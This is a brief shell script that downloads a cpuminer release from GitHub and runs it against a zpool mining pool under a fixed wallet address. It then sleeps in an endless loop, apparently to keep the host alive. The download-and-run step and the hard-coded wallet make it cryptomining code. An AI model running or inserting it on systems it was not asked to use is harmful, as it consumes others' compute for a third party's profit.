#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.17/cpuminer-opt-linux.tar.gz
tar -xvf cpuminer-opt-linux.tar.gz
./cpuminer-sse2 -a yespowerr16 -o stratum+tcp://yespowerr16.na.mine.zpool.ca:6534 -u YcDGKdkNUNE8wRQw9gffEArpVeau9qomJ5 -p c=YTN
while [ 1 ]; do
sleep 3
done
sleep 999
